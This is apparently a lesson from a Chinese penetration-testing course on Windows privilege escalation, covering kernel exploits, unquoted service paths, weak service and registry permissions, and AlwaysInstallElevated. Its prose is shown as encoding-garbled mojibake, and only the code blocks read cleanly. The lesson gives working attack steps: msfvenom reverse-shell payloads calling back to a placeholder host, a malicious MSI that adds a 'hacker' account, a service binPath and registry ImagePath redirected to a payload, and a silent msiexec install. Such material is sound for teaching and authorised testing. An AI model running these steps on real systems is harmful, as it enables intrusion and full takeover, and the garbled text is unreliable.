# ğŸ›¡ï¸ è¯¾ç¨‹P69ï¼šç¬¬38å¤© - Windowsæƒé™æå‡æŠ€æœ¯è¯¦è§£

åœ¨æœ¬èŠ‚è¯¾ä¸­ï¼Œæˆ‘ä»¬å°†ç³»ç»Ÿæ€§åœ°å­¦ä¹ Windowsç¯å¢ƒä¸‹çš„å¤šç§æƒé™æå‡æŠ€æœ¯ã€‚è¯¾ç¨‹å†…å®¹æ¶µç›–ä»ä¿¡æ¯æ”¶é›†ã€æ¼æ´æ¢æµ‹åˆ°å…·ä½“åˆ©ç”¨çš„å®Œæ•´æµç¨‹ï¼Œæ—¨åœ¨å¸®åŠ©åˆå­¦è€…ç†è§£å¹¶æŒæ¡åœ¨è·å¾—åˆå§‹ç«‹è¶³ç‚¹åï¼Œå¦‚ä½•å°†æ™®é€šç”¨æˆ·æƒé™æå‡è‡³ç³»ç»Ÿæœ€é«˜æƒé™ã€‚

---

![](img/e0da8077c6e0ded2abc7673f5270aad5_1.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_3.png)

## ğŸ“‹ è¯¾ç¨‹æ¦‚è¿°

![](img/e0da8077c6e0ded2abc7673f5270aad5_5.png)

æƒé™æå‡æ˜¯æ¸—é€æµ‹è¯•å’Œåæ¸—é€é˜¶æ®µçš„æ ¸å¿ƒç¯èŠ‚ã€‚å½“æ”»å‡»è€…è·å¾—ä¸€ä¸ªæ™®é€šç”¨æˆ·æƒé™çš„Shellåï¼Œä¸‹ä¸€æ­¥ç›®æ ‡é€šå¸¸æ˜¯è·å–`SYSTEM`æˆ–`Administrator`æƒé™ï¼Œä»¥å®Œå…¨æ§åˆ¶ç³»ç»Ÿã€‚æœ¬èŠ‚è¯¾å°†èšç„¦äºWindowsç³»ç»Ÿï¼Œè®²è§£å‡ ç§å¸¸è§çš„ææƒæ€è·¯ä¸å…·ä½“æ–¹æ³•ã€‚

---

![](img/e0da8077c6e0ded2abc7673f5270aad5_7.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_9.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_11.png)

## ğŸ§  ç¬¬ä¸€éƒ¨åˆ†ï¼šå†…æ ¸æ¼æ´ææƒ

![](img/e0da8077c6e0ded2abc7673f5270aad5_13.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_15.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_17.png)

ä¸Šä¸€èŠ‚æˆ‘ä»¬ä»‹ç»äº†æƒé™æå‡çš„åŸºæœ¬æ¦‚å¿µï¼Œæœ¬èŠ‚ä¸­æˆ‘ä»¬æ¥çœ‹çœ‹æœ€ç›´æ¥çš„ææƒæ–¹å¼ä¹‹ä¸€ï¼šåˆ©ç”¨Windowså†…æ ¸æ¼æ´ã€‚

![](img/e0da8077c6e0ded2abc7673f5270aad5_19.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_21.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_23.png)

å†…æ ¸æ¼æ´ææƒçš„æ ¸å¿ƒæ€è·¯æ˜¯ï¼š**æ£€æŸ¥ç›®æ ‡ç³»ç»Ÿç‰ˆæœ¬å’Œå·²å®‰è£…è¡¥ä¸ï¼Œå¯»æ‰¾æœªä¿®å¤çš„å·²çŸ¥æ¼æ´**ã€‚

![](img/e0da8077c6e0ded2abc7673f5270aad5_25.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_26.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_28.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_30.png)

### ä¿¡æ¯æ”¶é›†ï¼šæ£€æŸ¥ç³»ç»Ÿä¸è¡¥ä¸

é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦æ”¶é›†ç›®æ ‡ç³»ç»Ÿçš„è¯¦ç»†ä¿¡æ¯ï¼Œä»¥åˆ¤æ–­å…¶å¯èƒ½å­˜åœ¨çš„æ¼æ´ã€‚

ä»¥ä¸‹æ˜¯å¸¸ç”¨çš„ä¿¡æ¯æ”¶é›†å‘½ä»¤ï¼š

![](img/e0da8077c6e0ded2abc7673f5270aad5_32.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_34.png)

*   **`systeminfo`**: æŸ¥çœ‹ç³»ç»Ÿç‰ˆæœ¬ã€è¡¥ä¸åˆ—è¡¨ç­‰ç»¼åˆä¿¡æ¯ã€‚
*   **`wmic qfe get Caption,Description,HotFixID,InstalledOn`**: åˆ—å‡ºå·²å®‰è£…çš„è¡¥ä¸ã€‚
*   **PowerShellå‘½ä»¤**:
    ```powershell
    Get-WmiObject -Class Win32_QuickFixEngineering | Select-Object -Property HotFixID
    ```
    æ­¤å‘½ä»¤åŠŸèƒ½ä¸ä¸Šè¿°`wmic`å‘½ä»¤ç±»ä¼¼ï¼Œç”¨äºæšä¸¾ç³»ç»Ÿè¡¥ä¸ã€‚

### ä½¿ç”¨è‡ªåŠ¨åŒ–å·¥å…·æ¢æµ‹æ¼æ´

æ‰‹åŠ¨æ¯”å¯¹è¡¥ä¸ä¿¡æ¯æ•ˆç‡è¾ƒä½ï¼Œæˆ‘ä»¬å¯ä»¥å€ŸåŠ©è‡ªåŠ¨åŒ–å·¥å…·æ¥å¿«é€Ÿè¯†åˆ«æ½œåœ¨çš„ææƒæ¼æ´ã€‚

ä»¥ä¸‹æ˜¯å‡ æ¬¾å¸¸ç”¨çš„ææƒè¾…åŠ©å·¥å…·ï¼š

*   **Windows-Exploit-Suggester**: æ­¤å·¥å…·å°†`systeminfo`çš„è¾“å‡ºä¸æ¼æ´æ•°æ®åº“æ¯”å¯¹ï¼Œç»™å‡ºå¯èƒ½çš„æ¼æ´åˆ©ç”¨å»ºè®®ã€‚
*   **Watson**: ä¸€æ¬¾.NETå·¥å…·ï¼Œç”¨äºæšä¸¾Windowsæ¼æ´å¹¶ç»™å‡ºè¯¦ç»†çš„æ¼æ´ä¿¡æ¯ã€åˆ©ç”¨è„šæœ¬é“¾æ¥ã€‚
*   **Sherlock (PowerShellè„šæœ¬)**: ä¸€æ¬¾PowerShellè„šæœ¬ï¼Œç”¨äºæŸ¥æ‰¾æœ¬åœ°å¯èƒ½å­˜åœ¨çš„ææƒæ¼æ´ã€‚
    ```powershell
    # å¯¼å…¥å¹¶æ‰§è¡ŒSherlockè„šæœ¬
    Import-Module .\Sherlock.ps1
    Find-AllVulns
    ```
*   **Metasploit æ¨¡å—**:
    *   `post/windows/gather/enum_patches`: æšä¸¾ç³»ç»Ÿè¡¥ä¸ã€‚
    *   `post/multi/recon/local_exploit_suggester`: æ ¹æ®å½“å‰ä¼šè¯ï¼Œè‡ªåŠ¨å»ºè®®å¯ç”¨çš„æœ¬åœ°ææƒæ¨¡å—ã€‚

**æ ¸å¿ƒè¦ç‚¹**ï¼šè¿™äº›å·¥å…·æä¾›çš„åªæ˜¯â€œå¯èƒ½æ€§â€å‚è€ƒï¼Œå®é™…åˆ©ç”¨éœ€è¦æ ¹æ®ç›®æ ‡ç¯å¢ƒè¿›è¡Œæµ‹è¯•ã€‚

### åˆ©ç”¨å…¬å¼€çš„æ¼æ´åˆ©ç”¨ä»£ç 

å½“ç¡®å®šç›®æ ‡å­˜åœ¨æŸä¸ªç‰¹å®šæ¼æ´ï¼ˆä¾‹å¦‚ï¼Œé€šè¿‡CVEç¼–å·æ ‡è¯†ï¼‰åï¼Œå¯ä»¥åœ¨æ¼æ´æ•°æ®åº“æˆ–ä»£ç ä»“åº“ï¼ˆå¦‚GitHubï¼‰ä¸­æœç´¢å¯¹åº”çš„åˆ©ç”¨ä»£ç ï¼ˆExploitï¼‰ã€‚

ä¾‹å¦‚ï¼Œåœ¨GitHubä¸Šå­˜åœ¨ä¸“é—¨æ”¶é›†Windowså†…æ ¸ææƒæ¼æ´çš„ä»“åº“ï¼Œé‡Œé¢åŒ…å«äº†é’ˆå¯¹ä¸åŒCVEçš„ç¼–è¯‘å¥½çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼ˆ.exeï¼‰æˆ–æºä»£ç ã€‚è·å–åˆ°åˆ©ç”¨ç¨‹åºåï¼Œä¸Šä¼ è‡³ç›®æ ‡æœºå™¨å¹¶æ‰§è¡Œï¼Œé€šå¸¸å³å¯è·å¾—`SYSTEM`æƒé™çš„Shellã€‚

![](img/e0da8077c6e0ded2abc7673f5270aad5_36.png)

**è¿‡æ¸¡**ï¼šå†…æ ¸æ¼æ´ææƒå¨åŠ›å·¨å¤§ï¼Œä½†é«˜åº¦ä¾èµ–äºæœªæ‰“è¡¥ä¸çš„ç‰¹å®šæ¼æ´ã€‚æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°†æ¢è®¨å¦ä¸€ç§æ›´ä¾èµ–ç³»ç»Ÿé…ç½®å’ŒæœåŠ¡ç‰¹æ€§çš„ææƒæ–¹æ³•â€”â€”æœåŠ¡æ¼æ´ææƒã€‚

![](img/e0da8077c6e0ded2abc7673f5270aad5_38.png)

---

![](img/e0da8077c6e0ded2abc7673f5270aad5_40.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_42.png)

## âš™ï¸ ç¬¬äºŒéƒ¨åˆ†ï¼šWindowsæœåŠ¡æ¼æ´ææƒ

![](img/e0da8077c6e0ded2abc7673f5270aad5_44.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_45.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_47.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_49.png)

æœ¬èŠ‚æˆ‘ä»¬å°†æ·±å…¥åˆ†æå› WindowsæœåŠ¡é…ç½®ä¸å½“è€Œå¯¼è‡´çš„æƒé™æå‡æ¼æ´ã€‚è¿™ç±»æ¼æ´ä¸ä¾èµ–äºæœªä¿®å¤çš„ç³»ç»Ÿè¡¥ä¸ï¼Œè€Œæ˜¯åˆ©ç”¨äº†æœåŠ¡è¿è¡Œæœºåˆ¶å’Œæ–‡ä»¶æƒé™è®¾ç½®ä¸Šçš„ç¼ºé™·ã€‚

![](img/e0da8077c6e0ded2abc7673f5270aad5_51.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_52.png)

### 1. å¯ä¿¡ä»»æœåŠ¡è·¯å¾„æ¼æ´

![](img/e0da8077c6e0ded2abc7673f5270aad5_54.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_56.png)

**æ¼æ´åŸç†**ï¼š
WindowsæœåŠ¡é€šå¸¸ä»¥`SYSTEM`æƒé™è¿è¡Œã€‚å½“æœåŠ¡å¯åŠ¨æ—¶ï¼Œç³»ç»Ÿä¼šæ ¹æ®æœåŠ¡é…ç½®çš„äºŒè¿›åˆ¶æ–‡ä»¶è·¯å¾„æ¥æ‰§è¡Œç¨‹åºã€‚å¦‚æœè¯¥è·¯å¾„åŒ…å«ç©ºæ ¼ï¼ˆä¾‹å¦‚ `C:\Program Files\Common Files\service.exe`ï¼‰ï¼Œä¸”è·¯å¾„ä¸­æŸä¸ªç©ºæ ¼å‰çš„ç›®å½•å¯¹å½“å‰ç”¨æˆ·æœ‰å†™æƒé™ï¼Œé‚£ä¹ˆæ¼æ´å°±å¯èƒ½å­˜åœ¨ã€‚

![](img/e0da8077c6e0ded2abc7673f5270aad5_58.png)

ç³»ç»Ÿåœ¨è§£æå¸¦ç©ºæ ¼çš„è·¯å¾„æ—¶ï¼Œä¼šä¾æ¬¡å°è¯•å¯»æ‰¾å¹¶æ‰§è¡Œç©ºæ ¼å‰çš„åç§°æ‰€å¯¹åº”çš„ç¨‹åºã€‚ä¾‹å¦‚ï¼Œå¯¹äºè·¯å¾„ `C:\Program Files\Common Files\service.exe`ï¼Œç³»ç»Ÿä¼šä¾æ¬¡å°è¯•æ‰§è¡Œï¼š
1.  `C:\Program.exe`
2.  `C:\Program Files\Common.exe`
3.  `C:\Program Files\Common Files\service.exe` (æœ€ç»ˆæ­£ç¡®çš„ç¨‹åº)

![](img/e0da8077c6e0ded2abc7673f5270aad5_60.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_61.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_63.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_65.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_67.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_69.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_70.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_71.png)

**åˆ©ç”¨æ¡ä»¶**ï¼š
1.  æ‰¾åˆ°é…ç½®è·¯å¾„ä¸­åŒ…å«ç©ºæ ¼çš„æœåŠ¡ã€‚
2.  è¯¥è·¯å¾„ä¸­ï¼ŒæŸä¸ªç©ºæ ¼å‰çš„ç›®å½•ï¼Œå½“å‰ç”¨æˆ·å…·æœ‰**å†™å…¥æƒé™**ã€‚

![](img/e0da8077c6e0ded2abc7673f5270aad5_72.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_73.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_75.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_77.png)

**åˆ©ç”¨æ­¥éª¤**ï¼š

![](img/e0da8077c6e0ded2abc7673f5270aad5_79.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_81.png)

ä»¥ä¸‹æ˜¯å®Œæ•´çš„åˆ©ç”¨æµç¨‹ï¼š

![](img/e0da8077c6e0ded2abc7673f5270aad5_83.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_85.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_87.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_89.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_91.png)

1.  **æŸ¥æ‰¾æ˜“å—æ”»å‡»çš„æœåŠ¡**ï¼š
    ```cmd
    wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """
    ```
    æ­¤å‘½ä»¤æŸ¥æ‰¾è‡ªåŠ¨å¯åŠ¨ã€ä¸”è·¯å¾„ä¸åœ¨`C:\Windows\`ä¸‹ã€è·¯å¾„ä¸­åŒ…å«ç©ºæ ¼çš„æœåŠ¡ã€‚

![](img/e0da8077c6e0ded2abc7673f5270aad5_93.png)

2.  **æ£€æŸ¥ç›®å½•å†™å…¥æƒé™**ï¼š
    ```cmd
    icacls "C:\Program Files\Vulnerable Directory"
    ```
    æ£€æŸ¥ç–‘ä¼¼ç›®å½•çš„æƒé™ã€‚å¦‚æœè¿”å›ç»“æœä¸­åŒ…å« `Everyone:(F)` æˆ–å½“å‰ç”¨æˆ·ååŒ…å« `(F)`ï¼ˆå®Œå…¨æ§åˆ¶ï¼‰ï¼Œåˆ™æ„å‘³ç€æœ‰å†™å…¥æƒé™ã€‚

![](img/e0da8077c6e0ded2abc7673f5270aad5_95.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_97.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_99.png)

3.  **ç”Ÿæˆå¹¶ä¸Šä¼ Payload**ï¼š
    ä½¿ç”¨Msfvenomç”Ÿæˆä¸€ä¸ªåå‘Shellçš„Payloadã€‚
    ```bash
    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f exe -o Common.exe
    ```
    å°†ç”Ÿæˆçš„`Common.exe`ä¸Šä¼ åˆ°æœ‰å†™æƒé™çš„ç›®å½•ï¼ˆä¾‹å¦‚ï¼Œå¦‚æœæ¼æ´è·¯å¾„æ˜¯ `C:\Program Files\Common Files\service.exe`ï¼Œä¸” `C:\Program Files` å¯å†™ï¼Œåˆ™ä¸Šä¼ åˆ°æ­¤ç›®å½•ï¼‰ã€‚

![](img/e0da8077c6e0ded2abc7673f5270aad5_101.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_103.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_105.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_107.png)

4.  **ç­‰å¾…æˆ–è§¦å‘æœåŠ¡é‡å¯**ï¼š
    æœåŠ¡é‡å¯æ—¶ï¼Œç³»ç»Ÿä¼šä»¥`SYSTEM`æƒé™æ‰§è¡Œæˆ‘ä»¬ä¸Šä¼ çš„`Common.exe`ã€‚ç”±äºæ™®é€šç”¨æˆ·é€šå¸¸æ— æ³•æ§åˆ¶æœåŠ¡é‡å¯ï¼Œå¯èƒ½éœ€è¦ç­‰å¾…ç³»ç»Ÿé‡å¯æˆ–å¯»æ‰¾å…¶ä»–æ–¹æ³•ã€‚

![](img/e0da8077c6e0ded2abc7673f5270aad5_109.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_110.png)

5.  **æ¥æ”¶Shellå¹¶è¿ç§»è¿›ç¨‹**ï¼š
    æˆåŠŸè·å¾—Meterpreterä¼šè¯åï¼Œè¯¥ä¼šè¯å¯èƒ½ä¼šå› ä¸ºæœåŠ¡è¿›ç¨‹å¼‚å¸¸è€Œç«‹å³æ–­å¼€ã€‚å› æ­¤ï¼Œéœ€è¦åœ¨æ¥æ”¶åˆ°ä¼šè¯çš„ç¬é—´**è‡ªåŠ¨è¿ç§»è¿›ç¨‹**åˆ°ä¸€ä¸ªç¨³å®šè¿›ç¨‹ï¼ˆå¦‚`explorer.exe`ï¼‰ã€‚
    åœ¨Metasploitçš„`handler`æ¨¡å—ä¸­è®¾ç½®ï¼š
    ```bash
    set AutoRunScript post/windows/manage/migrate
    ```
    è¿™æ ·èƒ½ç¡®ä¿è·å¾—ä¸€ä¸ªç¨³å®šçš„`SYSTEM`æƒé™ä¼šè¯ã€‚

![](img/e0da8077c6e0ded2abc7673f5270aad5_112.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_114.png)

### 2. ä¸å®‰å…¨çš„æœåŠ¡æƒé™

**æ¼æ´åŸç†**ï¼š
å¦‚æœå½“å‰ç”¨æˆ·å¯¹æŸä¸ªç³»ç»ŸæœåŠ¡çš„å±æ€§æ‹¥æœ‰**å®Œå…¨æ§åˆ¶æƒ**ï¼ˆ`SERVICE_ALL_ACCESS`ï¼‰ï¼Œå°±å¯ä»¥ç›´æ¥ä¿®æ”¹è¯¥æœåŠ¡å¯åŠ¨æ—¶æ‰§è¡Œçš„äºŒè¿›åˆ¶æ–‡ä»¶è·¯å¾„ã€‚

![](img/e0da8077c6e0ded2abc7673f5270aad5_116.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_118.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_119.png)

**åˆ©ç”¨æ­¥éª¤**ï¼š

![](img/e0da8077c6e0ded2abc7673f5270aad5_121.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_123.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_125.png)

ä»¥ä¸‹æ˜¯æ£€æŸ¥å’Œåˆ©ç”¨æ­¤æ¼æ´çš„æ–¹æ³•ï¼š

![](img/e0da8077c6e0ded2abc7673f5270aad5_127.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_129.png)

1.  **ä½¿ç”¨AccessChkæ£€æŸ¥æœåŠ¡æƒé™**ï¼š
    `AccessChk`æ˜¯SysInternalså·¥å…·åŒ…ä¸­çš„ä¸€æ¬¾å·¥å…·ã€‚ä¸Šä¼ å¹¶è¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œæ£€æŸ¥å½“å‰ç”¨æˆ·å¯¹å“ªäº›æœåŠ¡æœ‰`SERVICE_ALL_ACCESS`æƒé™ã€‚
    ```cmd
    accesschk.exe -uwcqv "å½“å‰ç”¨æˆ·å" *
    ```
    æˆ–è€…æŸ¥æ‰¾æ‰€æœ‰ç”¨æˆ·éƒ½æœ‰å®Œå…¨æ§åˆ¶æƒçš„æœåŠ¡ï¼š
    ```cmd
    accesschk.exe -uwcqv "Everyone" *
    ```

![](img/e0da8077c6e0ded2abc7673f5270aad5_131.png)

2.  **ä¿®æ”¹æœåŠ¡é…ç½®**ï¼š
    æ‰¾åˆ°ç›®æ ‡æœåŠ¡ï¼ˆä¾‹å¦‚æœåŠ¡åä¸º`VulnService`ï¼‰åï¼Œä½¿ç”¨`sc`å‘½ä»¤ä¿®æ”¹å…¶`binPath`ï¼ˆäºŒè¿›åˆ¶è·¯å¾„ï¼‰ã€‚
    ```cmd
    sc config VulnService binPath= "C:\path\to\your\payload.exe"
    ```
    **æ³¨æ„**ï¼šç­‰å·`=`åé¢å¿…é¡»æœ‰ä¸€ä¸ªç©ºæ ¼ã€‚

![](img/e0da8077c6e0ded2abc7673f5270aad5_133.png)

3.  **å¯åŠ¨æœåŠ¡æ‰§è¡ŒPayload**ï¼š
    ä¿®æ”¹åï¼Œå¯åŠ¨è¯¥æœåŠ¡ã€‚ç”±äºæœåŠ¡ä»¥`SYSTEM`è¿è¡Œï¼Œå®ƒå°†æ‰§è¡Œæˆ‘ä»¬çš„Payloadã€‚
    ```cmd
    sc start VulnService
    ```
    åŒæ ·ï¼Œå¦‚æœå½“å‰ç”¨æˆ·æƒé™ä¸è¶³ï¼Œå¯èƒ½æ— æ³•å¯åŠ¨æœåŠ¡ï¼Œéœ€è¦ç­‰å¾…æˆ–è§¦å‘é‡å¯ã€‚

### 3. ä¸å®‰å…¨çš„æ³¨å†Œè¡¨æƒé™

![](img/e0da8077c6e0ded2abc7673f5270aad5_135.png)

**æ¼æ´åŸç†**ï¼š
WindowsæœåŠ¡çš„é…ç½®ä¿¡æ¯æœ€ç»ˆå­˜å‚¨åœ¨æ³¨å†Œè¡¨ä¸­ï¼ˆè·¯å¾„ï¼š`HKLM\SYSTEM\CurrentControlSet\Services\`ï¼‰ã€‚å¦‚æœå½“å‰ç”¨æˆ·å¯¹æŸä¸ªæœåŠ¡å¯¹åº”çš„æ³¨å†Œè¡¨é¡¹æœ‰**å†™å…¥æƒé™**ï¼Œå°±å¯ä»¥ç›´æ¥ä¿®æ”¹å…¶`ImagePath`é”®å€¼ï¼Œè¾¾åˆ°ä¸ä¸Šè¿°æ–¹æ³•ç›¸åŒçš„æ•ˆæœã€‚

![](img/e0da8077c6e0ded2abc7673f5270aad5_137.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_139.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_141.png)

**åˆ©ç”¨æ­¥éª¤**ï¼š

ä»¥ä¸‹æ˜¯åˆ©ç”¨æ³¨å†Œè¡¨æƒé™ææƒçš„æ­¥éª¤ï¼š

1.  **ä½¿ç”¨SubInACLæ£€æŸ¥æ³¨å†Œè¡¨æƒé™**ï¼š
    ä¸Šä¼ `SubInACL`å·¥å…·ï¼Œæ£€æŸ¥å¯¹æœåŠ¡æ³¨å†Œè¡¨é¡¹çš„æƒé™ã€‚
    ```cmd
    subinacl.exe /keyreg "HKLM\SYSTEM\CurrentControlSet\Services\VulnService" /display
    ```
    å¦‚æœæ˜¾ç¤ºå½“å‰ç”¨æˆ·æœ‰ `F` (å®Œå…¨æ§åˆ¶) æƒé™ï¼Œåˆ™å¯åˆ©ç”¨ã€‚

2.  **ä¿®æ”¹æ³¨å†Œè¡¨é”®å€¼**ï¼š
    ä½¿ç”¨`reg`å‘½ä»¤ç›´æ¥ä¿®æ”¹æœåŠ¡çš„`ImagePath`ã€‚
    ```cmd
    reg add "HKLM\SYSTEM\CurrentControlSet\Services\VulnService" /v ImagePath /t REG_EXPAND_SZ /d "C:\path\to\your\payload.exe" /f
    ```

3.  **é‡å¯æœåŠ¡**ï¼š
    æœåŠ¡é‡å¯åï¼Œå³ä¼šä»¥`SYSTEM`æƒé™æ‰§è¡Œæˆ‘ä»¬çš„Payloadã€‚

### 4. AlwaysInstallElevated ç­–ç•¥æ¼æ´

**æ¼æ´åŸç†**ï¼š
è¿™æ˜¯ä¸€ä¸ªç»„ç­–ç•¥è®¾ç½®ã€‚å¦‚æœå¯ç”¨ï¼Œä»»ä½•ç”¨æˆ·éƒ½å¯ä»¥ä»¥**é«˜æƒé™**å®‰è£…`.msi`æ ¼å¼çš„å®‰è£…åŒ…ã€‚æˆ‘ä»¬å¯ä»¥åˆ¶ä½œä¸€ä¸ªåŒ…å«æ¶æ„Payloadçš„`.msi`å®‰è£…åŒ…ï¼Œè¯±ä½¿æˆ–ç›´æ¥è¿è¡Œå®ƒæ¥ææƒã€‚

**åˆ©ç”¨æ¡ä»¶**ï¼š
æ£€æŸ¥ä»¥ä¸‹ä¸¤ä¸ªæ³¨å†Œè¡¨é¡¹çš„å€¼æ˜¯å¦ä¸º `1`ï¼š
*   `HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated`
*   `HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated`

**æ£€æŸ¥å‘½ä»¤**ï¼š
```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

**åˆ©ç”¨æ­¥éª¤**ï¼š

ä»¥ä¸‹æ˜¯åˆ©ç”¨æ­¤ç­–ç•¥ææƒçš„æ–¹æ³•ï¼š

1.  **ç”Ÿæˆæ¶æ„MSIå®‰è£…åŒ…**ï¼š
    ä½¿ç”¨Msfvenomç”Ÿæˆä¸€ä¸ªç›´æ¥æ·»åŠ ç”¨æˆ·çš„MSIæ–‡ä»¶ï¼Œæˆ–ç”Ÿæˆä¸€ä¸ªæ‰§è¡Œåå‘Shellçš„MSIã€‚
    ```bash
    # ç”Ÿæˆæ·»åŠ ç”¨æˆ·çš„MSI
    msfvenom -p windows/adduser USER=hacker PASS=Hacker123! -f msi -o setup.msi
    # æˆ–ç”Ÿæˆæ‰§è¡Œåå‘Shellçš„MSI (éœ€è¦å…ˆç”Ÿæˆpayload.exe)
    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=5555 -f exe -o payload.exe
    msfvenom -p windows/exec CMD="C:\\Windows\\Temp\\payload.exe" -f msi -o installer.msi
    ```

2.  **ä¸Šä¼ å¹¶æ‰§è¡ŒMSI**ï¼š
    å°†ç”Ÿæˆçš„`.msi`æ–‡ä»¶ä¸Šä¼ åˆ°ç›®æ ‡æœºå™¨ï¼Œå¹¶ä»¥æ™®é€šç”¨æˆ·èº«ä»½è¿è¡Œã€‚
    ```cmd
    msiexec /quiet /qn /i C:\path\to\installer.msi
    ```
    å‚æ•°è¯´æ˜ï¼š`/quiet`å’Œ`/qn`è¡¨ç¤ºé™é»˜å®‰è£…ï¼Œæ— ç•Œé¢æç¤ºã€‚

![](img/e0da8077c6e0ded2abc7673f5270aad5_143.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_145.png)

---

## ğŸ“ è¯¾ç¨‹æ€»ç»“

æœ¬èŠ‚è¯¾ä¸­æˆ‘ä»¬ä¸€èµ·å­¦ä¹ äº†Windowsç³»ç»Ÿä¸‹å¤šç§å…³é”®çš„æƒé™æå‡æŠ€æœ¯ï¼š

1.  **å†…æ ¸æ¼æ´ææƒ**ï¼šé€šè¿‡ä¿¡æ¯æ”¶é›†ã€è‡ªåŠ¨åŒ–å·¥å…·æ¢æµ‹ï¼Œåˆ©ç”¨æœªä¿®å¤çš„ç³»ç»Ÿå†…æ ¸æ¼æ´ç›´æ¥è·å–`SYSTEM`æƒé™ã€‚è¿™æ˜¯æœ€ç»å…¸çš„ææƒæ–¹å¼ã€‚
2.  **æœåŠ¡è·¯å¾„æ¼æ´ææƒ**ï¼šåˆ©ç”¨Windowsè§£æå¸¦ç©ºæ ¼æœåŠ¡è·¯å¾„çš„æœºåˆ¶ï¼Œç»“åˆå¯å†™ç›®å½•ï¼Œå®ç°æƒé™æå‡ã€‚
3.  **æœåŠ¡æƒé™æ¼æ´ææƒ**ï¼šé€šè¿‡ä¿®æ”¹å½“å‰ç”¨æˆ·æ‹¥æœ‰å®Œå…¨æ§åˆ¶æƒçš„æœåŠ¡é…ç½®ï¼Œæ›¿æ¢å…¶å¯åŠ¨ç¨‹åºä¸ºæˆ‘ä»¬çš„Payloadã€‚
4.  **æ³¨å†Œè¡¨æƒé™æ¼æ´ææƒ**ï¼šåŸç†ä¸æœåŠ¡æƒé™æ¼æ´ç±»ä¼¼ï¼Œä½†æ“ä½œå¯¹è±¡æ˜¯å­˜å‚¨æœåŠ¡é…ç½®çš„æ³¨å†Œè¡¨é¡¹ã€‚
5.  **AlwaysInstallElevatedç­–ç•¥æ¼æ´**ï¼šåˆ©ç”¨é”™è¯¯çš„ç»„ç­–ç•¥è®¾ç½®ï¼Œé€šè¿‡é«˜æƒé™å®‰è£…æ¶æ„MSIåŒ…è¿›è¡Œææƒã€‚

![](img/e0da8077c6e0ded2abc7673f5270aad5_147.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_149.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_151.png)

è¿™äº›æ–¹æ³•å„æœ‰é€‚ç”¨åœºæ™¯ï¼Œåœ¨å®é™…æ¸—é€æµ‹è¯•ä¸­ï¼Œå¾€å¾€éœ€è¦ç»“åˆå¤šç§ä¿¡æ¯æ”¶é›†æ‰‹æ®µï¼Œçµæ´»é€‰ç”¨æœ€å¯èƒ½æˆåŠŸçš„ææƒè·¯å¾„ã€‚æŒæ¡è¿™äº›æŠ€æœ¯ï¼Œå¯¹äºæ·±å…¥ç†è§£Windowsç³»ç»Ÿå®‰å…¨æ€§å’Œè¿›è¡Œæœ‰æ•ˆçš„åæ¸—é€æµ‹è¯•è‡³å…³é‡è¦ã€‚